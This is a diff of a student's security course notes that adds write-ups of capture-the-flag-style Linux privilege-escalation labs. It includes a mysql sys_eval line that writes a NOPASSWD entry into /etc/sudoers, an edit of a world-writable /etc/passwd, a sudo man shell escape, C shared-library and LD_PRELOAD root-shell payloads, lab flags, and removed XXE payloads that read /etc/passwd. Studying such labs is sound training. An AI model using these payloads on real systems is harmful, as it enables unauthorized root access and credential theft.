@@ -106,8 +106,15 @@ this markdown file is to be used in conjunction with the slides and is supposed 
     - [week 8 lab: Log Analysis for GoAccess](#week-8-lab-log-analysis-for-goaccess)
     - [week 8 lab: Log Analysis for Apache](#week-8-lab-log-analysis-for-apache)
     - [week8 lab: Privilege Escalation Web to Root](#week8-lab-privilege-escalation-web-to-root)
-- [less important labs to do soon:](#less-important-labs-to-do-soon)
+- [day 9 : Privilege Escalation](#day-9--privilege-escalation)
+    - [week 9 lab : File Permissions](#week-9-lab--file-permissions)
+    - [week9 lab: exploiting setuid programs](#week9-lab-exploiting-setuid-programs)
+    - [week 9 lab: EditingGoneWrong (man page)](#week-9-lab-editinggonewrong-man-page)
+    - [week 9 lab: Create missing custom library](#week-9-lab-create-missing-custom-library)
+    - [week9 lab: Modify LD_PRELOAD value (load order matters)](#week9-lab-modify-ld_preload-value-load-order-matters)
+    - [week 9 lab: Abusing Linux Capability CAP_DAC_READ_SEARCH](#week-9-lab-abusing-linux-capability-cap_dac_read_search)
 - [todos and toreads](#todos-and-toreads)
+- [less important labs to do soon:](#less-important-labs-to-do-soon)
 - [uncategorised readings:](#uncategorised-readings)
 - [Useful References](#useful-references)
 - [Questions:](#questions)
@@ -1837,9 +1844,10 @@ https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%2
   think of it as conversion into a stream of bytes while maintaining the interrelationships
 
 - this is pretty language specific actually. e.g. in the case of python, we have to exploit how picking is done (hence the `__reduce__` method being written that tells the deserialiser how to work with the object)
-- 
 
 [writeup on it](https://thehackerish.com/insecure-deserialization-explained-with-examples/)
+
+[more examples and mitigation](https://hdivsecurity.com/bornsecure/insecure-deserialization-attack-examples-mitigation/)
 
 
 ### week 8 lab: Pickeld Deserialiser II -Change serialized cookie with different value
@@ -1947,9 +1955,268 @@ Flags:
 
 
 ### week8 lab: Privilege Escalation Web to Root
-https://www.attackdefense.com/challengedetails?cid=85
-https://youtu.be/AeFzdX-vhW8
+[cid=85](https://youtu.be/AeFzdX-vhW8) 
+[exploit db description for the exploit](https://www.exploit-db.com/exploits/33867), it has the python proof of concept exploit code with it as well. 
+Put the POC exploit code on your own python file locally, then use python2.7 to run that exploit, passing in the victim ip addr and the php file identified. 
+This gives us a webshell, running as the user `www-data`. 
 
+Now we aim to do privilege escalation, so we look for any config files like so: 
+
+`$ find /app/ -name *conf* # finds anything that might be a config file` and then, to look into that file like so: 
+`$ cat /app/includes/configure.php` 
+
+
+We see that the running processes includes a mysql server that is running as root. Since mysql has a `sys_eval` function, a UDF (user-defined function), we can leverage that. 
+
+`mysql -u root -p W3lc0m3t04tt4ckd3f3nselabs -e "select sys_eval('whoami'); # this is just to test that the mysql servr is running as root, o/p should be root`
+
+`​mysql -u root -pW3lc0m3t04tt4ckd3f3nselabs -e "select sys_eval('echo \"www-dataALL=NOPASSWD:ALL\">/etc/sudoers'); # creates entry into sudoers file` 
+
+
+
+# day 9 : [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
+
+
+
+***There are various ways to try doinga privilege escalation:***
+
+1. **Abusing Elevation Control Mechanisms**
+   * for e.g. one approach to privilege escalation is to look at processes with their `setuid or setguid or sticky` bits set: 
+
+     [see here for clear description](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
+
+     ```
+     $ ls -l /bin/passwd
+     -rwsr-xr-x. 1 root root 27768 Feb 11  2017 /bin/passwd
+     ```
+     How to identify the setuid bit? As you surely have noticed looking at the output of the command above, the setuid bit is represented by an s in place of the x of the executable bit. The s implies that the executable bit is set, 
+     
+     otherwise you would see a capital S. 
+     This happens when the setuid or setgid bits are set, but the executable bit is not, showing the user an inconsistency: the setuid and setgit bits have no effect if the executable bit is not set. The setuid bit has no effect on directories. 
+
+
+     for `setguid`, it applies to files and dirs alike with some differences in its effect. 
+
+
+     for the sticky bit: 
+     
+     ```
+     $ ls -ld /tmp
+     drwxrwxrwt. 14 root root 300 Nov  1 16:48 /tmp
+     ```
+
+     see the `t` in place of the `x`, same, if executable bit not set then it's a capital `T`
+2. **Access TOken Manipulation** 
+3. **Boot or Logon AutoStart Execution** 
+4. **Boot or Logon Initialisation Scripts** 
+5. **Creating or Modifying System Process** e.g. daemons and all
+6. **Event Triggered Execution** 
+
+and many others
+
+
+
+*other descriptions on Privilege Escalation Strategies:*
+- [blog from a singtel company:](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/my-5-top-ways-to-escalate-privileges/) SAM file dumps, retrieving passwd file, using process permissions, sensitive info exposure, something about [DLL](https://support.microsoft.com/en-us/help/815065/what-is-a-dll) preloading/ DLL hijacking
+- [beyond trust's blog post on a way to do privilege escalation](https://www.beyondtrust.com/blog/entry/how-a-linux-attacker-can-escalate-from-low-level-privileges-to-root)
+- 
+
+
+some tools involved: 
+
+* use of the [`setenv()`](https://linux.die.net/man/3/unsetenv) function to add/overwrite env 
+
+
+
+
+### week 9 lab : File Permissions
+[cid=75](https://youtu.be/n6rjdhcVNCg) 
+
+Here we are given a terminal, we use the find command to look for world-writable files by the others group: `$ find / ! -type l -perm -o+w`, leaving out symlinks and the like. 
+
+We notice that `/etc/passwd` is world-writable, we doublecheck by listing its permissions. Upon reading the file, we see: that most of the users have unset passwds, hence we can addd one using the [openssl tool](https://www.openssl.org/docs/man1.1.0/man1/openssl-passwd.html):
+
+`$openssl passwd -1 -salt abc password # uses md5 hash algo with the string "abc" as the salt`
+
+so our hashed pwd shall now be: `$1$abc$BXBqpb9BZcZhXLgbee.0s/`, which we amend the passwd file with. 
+
+now we can log in as sudo!
+
+
+
+
+
+
+### week9 lab: exploiting [setuid](https://en.wikipedia.org/wiki/Setuid) programs
+[cid=73](https://youtu.be/ZoTmz4e2WKA)
+
+linux setuid programs on Linux systems can be used to do privilege escalation. 
+given two binaries, one of them has the setuid bit on, we check the file type just 
+incase `file welcome` and we see that it's an ELF file:
+  [ELF files and more about them: ](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/)
+
+  * something to do with binary files, have their own structure, basically a header and a content part, the header includes things like [magic numbers](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) ([includes file signature that reflcts the ELF file format](https://en.wikipedia.org/wiki/List_of_file_signatures), class types (bit-architecture))
+    * there's something about [endianness](https://en.wikipedia.org/wiki/Endianness)
+
+**NB**: to see the strings within a binary file, use the [`strings`](https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/) command. We see that the other binary file, called `greetings` is probably being called by welcome, so we might try to replace with some other command that is more useful to us and which will run as root.
+
+we reuse the name for `greetings`, copy over `/bin/bash` and name is as `greetings` so that's will be run instead, giving us sudo access (bash shell). The flag is then at `/root/`: `b92bcdc876d52108778e2d81f3b01494`
+
+
+### week 9 lab: EditingGoneWrong (man page)
+[cid=80](https://youtu.be/wbQIrnD3fkc)
+
+lab description: 
+> You have managed to get access to the "student" account on the client's server. This is bad enough as all the student resources are available to you. You are now trying to escalate privileges to get root. After some digging around and from other sources, you figure out that the same person in the organization uses both the student account and the root account on the system. 
+
+
+**approach**: 
+
+We first need to find the setuid program, so we do: `find / -user root -perm -4000 -exec ls -ldb {} +` but this is a deadend. 
+
+We list out where sudo might be used using `sudo -l`, giving us: [manpage for the sudo cmd](https://linux.die.net/man/8/sudo)
+
+  ```
+  student@attackdefense:~$ sudo -l
+  Matching Defaults entries for student on attackdefense:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+  User student may run the following commands on attackdefense:
+      (root) NOPASSWD: /usr/bin/man
+  ```
+meaning the man command can be run using sudo w/o providing any pwd e.g. `sudo man ls`. From this, we edit as an external command: `!/bin/bash` as in vi, giving us sudo access to the shell. 
+
+the flag is in `/root/` : `74f5cc752947ec8a522f9c49453b8e9a`
+
+### week 9 lab: Create missing custom library 
+[cid=90](https://youtu.be/w-Il1TwmV60)
+
+
+[static vs shared libraries](https://www.geeksforgeeks.org/difference-between-static-and-shared-libraries/)
+
+lab description: 
+> A Linux system runs a complicated system of well referenced shared libraries and programs that use them. It is very common for administrators to move / delete things but forget to remove references! Most of the time this just causes programs to error and not run. However, in some cases this can be exploited to escalate privileges! 
+
+approach: 
+
+Again, we search for programs with the setuid bit having been set: 
+```bash
+student@attackdefense:~$ find / -type f -perm -04000 -ls 2>/dev/null
+109580555     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2018 /bin/su
+109580561     28 -rwsr-xr-x   1 root     root        26696 May 16  2018 /bin/umount
+109580538     44 -rwsr-xr-x   1 root     root        43088 May 16  2018 /bin/mount
+109581179     40 -rwsr-xr-x   1 root     root        40344 Jan 25  2018 /usr/bin/newgrp
+109581090     44 -rwsr-xr-x   1 root     root        44528 Jan 25  2018 /usr/bin/chsh
+109581136     76 -rwsr-xr-x   1 root     root        75824 Jan 25  2018 /usr/bin/gpasswd
+109581189     60 -rwsr-xr-x   1 root     root        59640 Jan 25  2018 /usr/bin/passwd
+109581088     76 -rwsr-xr-x   1 root     root        76496 Jan 25  2018 /usr/bin/chfn
+101525705     12 -rwsr-xr-x   1 root     root         8280 Sep 26  2018 /usr/bin/welcome
+```
+
+ which gives us a list of default programs and other non-default binaries too e.g. the `welcome` binary, so we try to execute that binary. 
+
+We get a dependency error, it's looking for `libwelcome.so`, a shared lib for execution but that name can't be resolved.
+
+***Shared libraries are in the `/etc/ls.so.conf.d` dir***
+
+  ```
+  student@attackdefense:/etc/ld.so.conf.d$ ls -l
+  total 12
+  -rw-r--r-- 1 root root  18 Sep 26  2018 custom.conf
+  -rw-r--r-- 1 root root  44 Jan 27  2016 libc.conf
+  -rw-r--r-- 1 root root 100 Apr 16  2018 x86_64-linux-gnu.conf
+  ```
+
+  we can look into the custom conf file here, which points to a dir that doesn't exist: `/home/student/lib`, so we create it as per what we want. In here, we input in our "payload", the following C program: 
+
+  ```c
+  # include <stdio.h>
+
+  int test() {
+    printf(" Test");
+  }
+
+  ```
+
+  *now, we compile this C file into a shared library: `gcc -shared -o libwelcome.so -fPIC libwelcome.c`, taking note that the output filename has to be the same one as the welcome binary had been looking for*. 
+
+  We realise that we need a `welcome()` function so modify it to: 
+  
+
+  ```c
+  #include<stdio.h> 
+  #include<stdlib.h> 
+  #include<unistd.h>
+
+  int welcome() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+  }
+  ```
+
+  As before, the flag is in `/root/`: `5b8dc7e64c56a312bedc5257e323c2fc`
+
+
+See explanation diagrams in Day9 slides!
+
+
+### week9 lab: Modify LD_PRELOAD value (load order matters)
+[cid=88](https://youtu.be/TNG4xUSxCPM)
+
+lab description: 
+> So you've got a foothold on a regular user account on a Linux box? You've tried to escalate privileges to root but nothing seems to work?  Remember the order in which programs, scripts and libraries load dictates what executes! 
+
+approach: 
+
+First we study the output of listing sudo stuff:
+  ```
+  student@attackdefense:~$ sudo -l
+  Matching Defaults entries for student on attackdefense:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+      env_keep+=LD_PRELOAD
+
+  User student may run the following commands on attackdefense:
+      (root) NOPASSWD: /usr/sbin/apache2
+  ```
+  insight:
+    * user called `student` can run apache2 as root w/o providing pwd
+    * `LD_PRELOAD` env variable can be set
+  
+So we write a script that will leverage on the preload: 
+
+  ```c
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>
+
+  void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+  }
+  ```
+  which will give us a elevated shell. compile as a shared library called shell.so
+
+Now, since we can change the value of the `LD_PRELOAD` env (as shown by the sudo listing), we 
+set that and run apache2: `sudo LD_PRELOAD=/home/student/shell.so apache2`
+
+this gives us a sudo terminal, the flag is in `/root/`: `368b219937989a57d0c1191ac697cc83`
+
+### week 9 lab: Abusing Linux Capability CAP_DAC_READ_SEARCH
+[1343](https://youtu.be/ondqDg8r6G8)
+
+TBC
+
+
+
+
+# todos and toreads
+
+1. the urls under the tools category might not have been read yet
 
 
 # less important labs to do soon: 
@@ -1957,42 +2224,17 @@ https://youtu.be/AeFzdX-vhW8
 - [some mvc thing](https://www.attackdefense.com/challengedetails?cid=1880) and [another mvc thing](https://www.attackdefense.com/challengedetails?cid=1802)
 - burp login form attack and http attack
 
-# todos and toreads
+
 
 # uncategorised readings:
-
+* [a brief on all the owasp top 10](https://sucuri.net/guides/owasp-top-10-security-vulnerabilities-2020/)
 * [deception](https://www.helpnetsecurity.com/2018/12/06/introduction-deception-technology/) technology and [honeypots](https://roi4cio.com/en/categories/category/deception-techniques-and-honeypots/)
    - this is actually really cool. Some forefront-of-cybersec kind of thing
-
 * [using default credential config can be really problematic because shodan is really useful in searching for stuff!](https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/)
-
 * [browser plugin and extensions](https://www.securityweek.com/websites-can-exploit-browser-extensions-steal-user-data) they are shady and shouldn't be trusted like that. The standards that extensions have to follow is more lax than those of websites themselves, hence extensions are very exploitative.
-
 * [devsecops: not exactly devops and with security in mind](https://www.sumologic.com/insight/devsecops-rugged-devops/#:~:text=DevSecOps%20involves%20creating%20a%20'Security,processes%20within%20an%20agile%20framework)
-
-* XXE:
-
-    * https://gracefulsecurity.com/xxe-xml-external-entity-injection/
-    * https://portswigger.net/web-security/xxe#:~:text=Some%20applications%20receive%20client%2Dsubmitted,by%20the%20backend%20SOAP%20service.
-    * more on xml dtd (doctype declaration): https://xmlwriter.net/xml_guide/doctype_declaration.shtml
-            * Example of external private DTD:
-
-            <!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>
-
-            <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.81.46.2:9000/passwd">]> <data><text>&passwd;</text></data>
-
-* broken access control: https://www.packetlabs.net/broken-access-control/
-      * SAML: https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/
-
-
-* communication architecture for remote procedures/services:  https://medium.com/api-university/architectural-styles-for-apis-soap-rest-and-rpc-9f040aa270fa#:~:text=In%20general%2C%20an%20architectural%20style,%2Dscale%2C%20predefined%20solution%20structure.&text=The%20REST%20style%20(Representational%20State,the%20SOAP%20style%20and%20GraphQL.
-
 * [SAST vs DAST](https://www.kiuwan.com/blog/application-security-tools-comparison/): 
   - these areapp security testing tools, mainly differ by how the testing is done
-
-
-
-
 * [CRLF characters](https://tools.ietf.org/html/rfc2616)
 * [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
 * [what meterpreter is](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)
@@ -2003,7 +2245,7 @@ https://youtu.be/AeFzdX-vhW8
 * [opaque actually makes things opaque](https://medium.com/@billatnapier/opaque-one-of-the-great-advancements-in-cybersecurity-aace51a76560)
 * look into learning GOlang for writing own scripts and crawlers
 * port(external pov) vs socket(as file descriptors?)
-* 
+  
 
 
 
@@ -2029,6 +2271,10 @@ https://youtu.be/AeFzdX-vhW8
 * Portswigger is a damn good learning and news resource 
 * [XSS is a very deep area](https://excess-xss.com/)
 * [HackerOne has a free course available for everyone](https://www.hacker101.com/)
+* [example uses for the find command](https://www.binarytides.com/linux-find-command-examples/)
+* [MitreAttack describes a lot of attack tactics and techniques!](https://attack.mitre.org/)
+
+
 
 
 
